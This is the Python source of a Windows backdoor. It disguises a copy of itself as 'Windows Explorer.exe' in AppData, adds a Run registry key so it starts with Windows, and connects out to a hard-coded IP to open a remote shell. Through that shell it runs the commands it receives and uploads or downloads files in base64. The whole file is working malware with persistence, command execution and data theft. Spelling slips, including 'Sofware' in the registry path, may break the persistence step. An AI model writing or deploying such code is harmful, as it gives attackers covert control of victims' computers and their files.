#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import shutil
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.presistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def presistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\\Sofware\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + file_location + '"', shell = True)
    
    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def json_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def sys_command(self, command):
        return subprocess.check_output(command, shell = True)
    
    def chang_directory(self, path):
        os.chdir(path)
        return "current directory is " + path
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "upload compeleted"

    def run(self):
        try:
            while True:
                command = self.json_receive()
                if command[0] == "exit":
                    exit()
                elif command[0] == "cd":
                    command_result = self.chang_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:    
                    command_result = self.sys_command(command).decode()
                self.json_send(command_result)
        except Exception:
            command_result = "[-] Somthing went wrong"

try:    
    my_backdoor = Backdoor("120.120.1.1", 8080)
    my_backdoor.run()
except Exception:
    sys.exit()